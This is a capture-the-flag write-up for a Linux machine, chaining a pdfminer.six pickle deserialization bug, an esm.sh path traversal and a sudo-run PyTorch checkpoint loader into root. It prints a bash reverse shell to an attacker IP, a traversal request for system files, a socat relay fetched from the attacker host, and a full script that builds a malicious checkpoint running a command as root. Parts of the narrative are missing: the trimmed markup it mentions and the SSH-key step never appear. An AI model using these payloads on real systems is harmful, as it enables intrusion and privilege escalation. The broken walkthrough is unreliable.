Bedside is a Linux box built around a clinical research portal that leans on pdfminer.six for document processing. An insecure-deserialization bug in pdfminer.six's CMap loader (CVE-2025-64512) hands over a shell inside a Docker container, and a path-traversal flaw in an internal esm.sh-powered image viewer (CVE-2025-59341) discloses another user's SSH private key for the user flag. Root falls to a NOPASSWD sudo rule on a PyTorch training script that deserializes an attacker-supplied checkpoint file with root privileges.

The `X-Powered-By: pdfminer.six` header stood out immediately. **pdfminer.six is an open-source Python library for extracting and analysing PDF content** — unlike a plain text extractor, it parses the internal structure of a PDF document to recover its exact layout, fonts, and encodings. A portal that reviews research documents processing uploads with it is a strong hint that whatever gets uploaded, however it's labelled, ends up handed to pdfminer.six on the backend.

That was reason enough to check for known issues in the library. **CVE-2025-64512** matched: a [public proof-of-concept](https://github.com/luigigubello/CVE-2025-64512-Polyglot-PoC) packages the exploit as a single polyglot file and includes a ready-to-run generator.

## Exploitation

### CVE-2025-64512 — pdfminer.six Insecure Deserialization (RCE)

pdfminer.six resolves PDF character-map (CMap) references against a bundled `cmap/` directory, and it does so by calling `pickle.loads()` on files ending in `.pickle.gz`. The library never constrained the resolved CMap name to that directory: a PDF can reference an encoding that points anywhere on the filesystem, as long as the target ends in `.pickle.gz`. Since Python's `pickle` executes arbitrary callables through an object's `__reduce__` method during deserialization, whoever controls the bytes of that file controls code execution the instant it's loaded — no further interaction, no separate "run" step. The polyglot PoC packages both halves — the PDF that references the malicious CMap path and the pickle payload itself — into one file, so a single upload does the whole job.

```bash
git clone https://github.com/luigigubello/CVE-2025-64512-Polyglot-PoC
python3 CVE-2025-64512.py --command "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' &"
```

With a listener ready and the crafted file fed to the same upload endpoint probed earlier, pdfminer.six's CMap resolution stepped outside the trusted directory and deserialized the payload:

```bash
nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.248.191 33738
bash: cannot set terminal process group (297): Inappropriate ioctl for device
bash: no job control in this shell
datawrangler@data-wrangler:/app$
```

The listener caught the callback as `datawrangler`, inside a container named `data-wrangler` — `/app` as a working directory and the hostname both point to a containerized service, not the bare host. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

The bulk of the component markup and CSS is trimmed above — what mattered was the title, the ESM-style imports pulling React straight from `./vendor/`, and one particular console.log line. It's a React single-page app for viewing MRI-style slice masks, bundled through **esm.sh** — a "nobuild" CDN that serves npm packages as native ES modules, so pages can `import` them directly with no bundler step. The `esm.sh/x` reference in that log line was the identifying detail.

curl already returned the full source, but actually loading the app in a browser — to interact with it the way a real client would — meant reaching port 3000 from outside the box, which the original nmap scan had shown filtered. The fix reuses the same asymmetry a container escape often relies on: a connection the target itself initiates isn't "external" traffic, so whatever rule is blocking inbound access to 3000 doesn't apply to it. Downloading a static `socat` binary and relaying through a port that isn't filtered sidesteps the block entirely:

```bash
# attacker box
mv /home/ander/Descargas/socat .
python3 -m http.server
```

```bash
# datawrangler@data-wrangler
curl -s http://<ATTACKER_IP>:8000/socat -o socat
./socat tcp-listen:4000 tcp-connect:10.129.248.191:3000
```

`socat` on the target listens on port 4000 and forwards every connection to `10.129.248.191:3000` — the box's own external IP, but the connection to it originates locally, so it lands where the direct external probe was dropped. Port 4000 wasn't in scope for whatever rule blocks 3000, so it can now be reached directly from the attacker box, loading the app in an actual browser, not just curl.

### CVE-2025-59341 — esm.sh Path Traversal (LFI)

esm.sh had a known issue: **CVE-2025-59341**, a path-traversal flaw in the service's URL-handling router (`server/router.go`). Requests shaped like a package path can escape the intended module directory with enough `../` sequences, and the server reads and returns whatever file the traversal lands on — no authentication required.

```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```

`/etc/passwd` from inside the same esm.sh process confirmed the traversal and surfaced a new user: `developer`, with a real login shell — a stronger target than `datawrangler`'s restricted `/bin/sh`.

### SSH Key Disclosure and Login as `developer`

An LFI primitive is a direct line to SSH keys, not just configuration files:

    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py

One command, no password, running as any user — the entire question becomes what `bedside_trainer.py` will do with attacker-controlled input.

### The Trainer Script

```python
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None
    # ...

def main():
    # ...
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE
        )

        # Minimal mock engine for MONAI handler compatibility
        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly
    # ...
```

The script picks up the most recently modified `.pt` file in a checkpoint directory and hands it to MONAI/Ignite's `CheckpointLoader`. Under the hood, that calls `torch.load(..., weights_only=False)`, and `torch.load` deserializes with `pickle` — exactly the same primitive as the pdfminer.six bug from the foothold, wearing different clothes. Feed it a `.pt` file containing an object with a malicious `__reduce__`, and that code runs the moment the file is loaded — here, as root, since the whole script runs under the NOPASSWD rule.

`/datastore/checkpoints/` turned out to be writable by `datawrangler`, the very user the initial RCE landed as. The plan: drop a malicious checkpoint there, trigger the trainer as `developer` via `sudo`, get code execution as root.

### Crafting the Malicious Checkpoint

A real `.pt` file is a ZIP archive containing a pickled object graph at `archive/data.pkl`. Building a minimal one that trips `__reduce__` on load doesn't require touching PyTorch at all — just `pickle` and `zipfile`:

```python
#!/usr/bin/env python3
"""
build_evil_pt.py - craft a malicious torch checkpoint (.pt) for CVE-style
insecure deserialization via torch.load(weights_only=False).

A torch .pt file is a ZIP archive containing:
  - archive/data.pkl   (the pickled object graph)
  - archive/version    (torch serialization version)

torch.load unpickles archive/data.pkl, so an object whose __reduce__
runs a command gives code execution in the loader's context (here: root).

Usage:
    python3 build_evil_pt.py                 # default cmd, output checkpoint_epoch_99.pt
    python3 build_evil_pt.py -c "id > /tmp/x" -o evil.pt
"""

import argparse
import os
import pickle
import zipfile


class RCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def build(cmd, out):
    # pickle a dict shaped like a real checkpoint; the payload rides in "model"
    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)

    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")

    with open(out, "rb") as f:
        magic = f.read(4)
    print(f"[+] wrote {out} ({os.path.getsize(out)} bytes)")
    print(f"[+] magic bytes: {magic.hex()}  (504b0304 = PK / valid ZIP)")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Build a malicious torch .pt checkpoint")
    p.add_argument("-c", "--command", default="chmod +s /bin/bash",
                   help="command executed by root on torch.load (default: chmod +s /bin/bash)")
    p.add_argument("-o", "--output", default="checkpoint_epoch_99.pt",
                   help="output filename (default: checkpoint_epoch_99.pt)")
    args = p.parse_args()
    build(args.command, args.output)
```

`__reduce__` returning `(os.system, (self.cmd,))` is the entire exploit: unpickling that object calls `os.system(cmd)` directly, with no further interaction needed. The payload rides inside a dict shaped like a real checkpoint (`{"model": ...}`) so it survives being wrapped and unwrapped by the loading code before anything inspects its type. Run with no arguments, it uses its defaults — `chmod +s /bin/bash` as the command, `checkpoint_epoch_99.pt` as the output:

```bash
python3 privEsc.py
```

### Clearing the Guards

The trainer script wasn't quite that permissive. Two checks stood in the way:

- **Extension filtering**: the script logs that it's "currently fully functional with image files (jpeg, png, etc.)" — the `processed/` directory needs at least one valid file present, and it can't be a leftover `.txt`.
- **Staging cleanup**: `staging/` also can't contain `.txt` files, and the environment regenerates them periodically — clearing both directories has to happen right before triggering the script, not well in advance.

```bash
# attacker box
mv /home/ander/Descargas/example.png .
python3 -m http.server
```

```bash
# datawrangler@data-wrangler
curl -s http://<ATTACKER_IP>:8000/checkpoint_epoch_99.pt -o evil.pt
curl -s http://<ATTACKER_IP>:8000/example.png -o example.png

cd /datastore
cp example.png processed/
rm staging/*.txt
rm processed/*.txt
```

The malicious checkpoint went into `/datastore/checkpoints/`, a valid PNG went into `processed/` to satisfy the file-type check, and both directories were cleared of `.txt` files immediately before running the trainer.

### Triggering the Deserialization

```bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1298416 May  9 12:07 /bin/bash

sudo python3 /opt/trainer/bedside_trainer.py
2026-08-26 16:03:11,097 | INFO | Device: cpu
2026-08-26 16:03:11,338 | INFO | Found checkpoint /datastore/checkpoints/evil.pt, loading with CheckpointLoader (callable mode)...
Traceback (most recent call last):
[...]
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
```

The script crashed — and it doesn't matter. `os.system()` returns an integer exit code, and PyTorch's loader expected a dict-shaped state; the `TypeError` is that mismatch surfacing downstream. But `__reduce__` fires the instant `pickle.loads()` evaluates the object, which happens well before anything checks its type. The command had already run as root, milliseconds before the script noticed anything was wrong.

```bash
ls -la /bin/bash
-rwsr-sr-x 1 root root 1298416 May  9 12:07 /bin/bash

/bin/bash -p
bash-5.2# cat /root/root.txt
```

The setuid bit on `/bin/bash` confirms it: `chmod +s /bin/bash` ran as root. `bash -p` preserves privileges across the setuid boundary, dropping straight into a root shell.

## Key Takeaways

- **Insecure deserialization isn't a one-off bug, it's a recurring anti-pattern.** The exact same primitive — an object graph unpickled without regard for who supplied the bytes — showed up twice on this box in two completely unrelated components: a PDF-parsing library and a machine-learning checkpoint loader. Any code path that calls `pickle.load`/`pickle.loads`, or wraps one (as `torch.load(weights_only=False)` does), deserves the same suspicion regardless of the domain it sits in.
- **`pickle`'s `__reduce__` fires at deserialization time, not at use time.** A script that crashes immediately after loading untrusted data hasn't failed safely — the payload already ran before the crash. Don't read "the script threw an exception" as "nothing happened."
- **Firewall rules scoped to "external" traffic have a blind spot: the host itself.** A port dropped for inbound connections from outside is often still reachable from a process running locally on that host. Relaying through a locally-initiated connection (here, `socat`) turns that blind spot into a tunnel.
- **Response headers are free reconnaissance.** `X-Powered-By: pdfminer.six` on an unrelated HTML response was the single thread that led to the entire foothold; headers worth reading rarely announce themselves as important.
- **An LFI primitive is a credentials primitive.** Once arbitrary file read is confirmed, checking for SSH keys under every enumerated home directory should be reflexive — it's usually a more direct path to access than anything else the traversal turns up.
- **A NOPASSWD sudo rule is only as safe as everything the target script trusts.** `bedside_trainer.py` never read attacker input directly; it trusted a file dropped by a lower-privileged user into a directory that user could write to. Scoping a sudo rule to a script's name says nothing about what that script will do with data it doesn't control.
